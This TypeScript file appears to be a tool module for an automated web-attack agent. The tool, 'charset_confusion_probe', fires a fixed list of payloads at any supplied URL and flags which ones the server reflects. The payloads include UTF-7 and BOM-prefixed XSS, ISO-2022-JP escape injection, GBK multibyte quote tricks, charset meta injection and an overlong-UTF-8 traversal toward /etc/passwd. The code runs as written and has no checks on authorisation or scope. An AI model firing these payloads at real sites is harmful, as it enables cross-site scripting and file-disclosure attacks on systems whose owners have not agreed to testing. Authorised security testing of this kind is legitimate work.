// T36 — charset_confusion_probe
// Charset/encoding confusion attacks: UTF-7 XSS, UTF-16BE injection,
// ISO-2022-JP escape sequences, GB18030 multibyte tricks.

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'charset_confusion_probe',
  description:
    'Probe for charset/encoding confusion attacks. Fires UTF-7 XSS (+ADw-script+AD4-), ' +
    'UTF-16BE injection, ISO-2022-JP escape-sequence injection, GB18030 multibyte tricks, ' +
    'and overlong UTF-8. Detects XSS filters and input validators that operate on bytes ' +
    'rather than decoded codepoints.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url',         type: 'string', required: true,  description: 'Target URL' },
    { name: 'method',      type: 'string', required: false, description: 'HTTP method', default: 'GET' },
    { name: 'body_field',  type: 'string', required: false, description: 'Body field name for POST requests', default: 'q' },
    { name: 'value',       type: 'string', required: false, description: 'Base input value (will be mutated)', default: 'test' },
    { name: 'headers',     type: 'string', required: false, description: 'JSON extra headers' },
    { name: 'timeout_ms',  type: 'number', required: false, description: 'Per-request timeout ms', default: 8000 },
  ],
};

const CHARSET_PAYLOADS: Array<{ name: string; value: string; charset?: string }> = [
  // UTF-7 XSS
  { name: 'utf7_script_open',         value: '+ADw-script+AD4-alert(1)+ADw-/script+AD4-',           charset: 'UTF-7' },
  { name: 'utf7_img_onerror',         value: '+ADw-img src=x onerror=alert(1)+AD4-',               charset: 'UTF-7' },
  { name: 'utf7_angle_brackets',      value: '+ADw-+AD4-',                                           charset: 'UTF-7' },
  // ISO-2022-JP escape injection
  { name: 'iso2022jp_escape',         value: '\x1b(B<script>alert(1)</script>',                     charset: 'ISO-2022-JP' },
  { name: 'iso2022jp_shift',          value: '\x1b$B<script>\x1b(B',                               charset: 'ISO-2022-JP' },
  // Overlong UTF-8 (may bypass byte-pattern filters)
  { name: 'overlong_slash',           value: '%c0%af..%c0%afetc%c0%afpasswd' },
  { name: 'overlong_null',            value: '%c0%80' },
  // GB18030 / GBK multibyte trails
  { name: 'gbk_backslash',            value: '\x81\x40\\' },
  { name: 'gbk_quote',               value: '\x81\x40\'' },
  // UTF-16 surrogate pair confusion
  { name: 'utf16_surrogate',          value: '😀<script>alert(1)</script>' },
  // BOM prefix
  { name: 'bom_utf8',                value: '\xef\xbb\xbf<script>alert(1)</script>' },
  { name: 'bom_utf16le',             value: '\xff\xfe<\x00s\x00c\x00r\x00i\x00p\x00t\x00>' },
  // Charset meta injection
  { name: 'charset_meta_inject',     value: '<meta charset=UTF-7>+ADw-script+AD4-alert(1)+ADw-/script+AD4-' },
];

export const charsetConfusionProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const method = String(params.method || 'GET').toUpperCase();
    const bodyField = String(params.body_field || 'q');
    const timeoutMs = Number(params.timeout_ms || 8000);

    if (!url) return { output: 'url required', parsed: { error: 'missing_url' } };

    let extraHeaders: Record<string, string> = { 'User-Agent': 'Mozilla/5.0 GENESIS/4.0' };
    try { if (params.headers) Object.assign(extraHeaders, JSON.parse(String(params.headers))); } catch { /* ignore */ }

    const results: Array<{ name: string; status: number; reflected: boolean; body_excerpt: string; time_ms: number; error?: string }> = [];

    for (const payload of CHARSET_PAYLOADS) {
      const start = Date.now();
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        const hdrs: Record<string, string> = { ...extraHeaders };
        if (payload.charset) hdrs['Accept-Charset'] = payload.charset;
        let resp: Response;
        if (method === 'GET') {
          const u = url.includes('PARAM') ? url.replace('PARAM', encodeURIComponent(payload.value)) : `${url}?${bodyField}=${encodeURIComponent(payload.value)}`;
          resp = await fetch(u, { headers: hdrs, signal: controller.signal });
        } else {
          hdrs['Content-Type'] = `application/x-www-form-urlencoded${payload.charset ? `; charset=${payload.charset}` : ''}`;
          resp = await fetch(url, { method, headers: hdrs, body: `${bodyField}=${encodeURIComponent(payload.value)}`, signal: controller.signal });
        }
        clearTimeout(timer);
        const text = await resp.text();
        const reflected = text.includes(payload.value) || text.includes('script') || text.includes('alert');
        results.push({ name: payload.name, status: resp.status, reflected, body_excerpt: text.substring(0, 100).replace(/\s+/g, ' '), time_ms: Date.now() - start });
      } catch (err) {
        results.push({ name: payload.name, status: 0, reflected: false, body_excerpt: '', time_ms: Date.now() - start, error: String(err) });
      }
    }

    const reflected = results.filter(r => r.reflected);
    const lines = [
      `charset_confusion_probe — ${CHARSET_PAYLOADS.length} charset-confusion payloads`,
      `Target: ${url.substring(0, 80)}`,
      `Reflected/interesting: ${reflected.length}/${results.length}`,
      '─'.repeat(72),
    ];
    for (const r of results) {
      const flag = r.reflected ? '⚡ REFLECTED' : (r.error ? '✗ ERR      ' : '  ·        ');
      lines.push(`  ${flag}  [${r.name.padEnd(26)}]  status=${r.status}${r.error ? `  err=${r.error.substring(0, 40)}` : ''}`);
    }

    return {
      output: lines.join('\n'),
      parsed: { total: results.length, reflected_count: reflected.length, reflected, results },
    };
  },
};
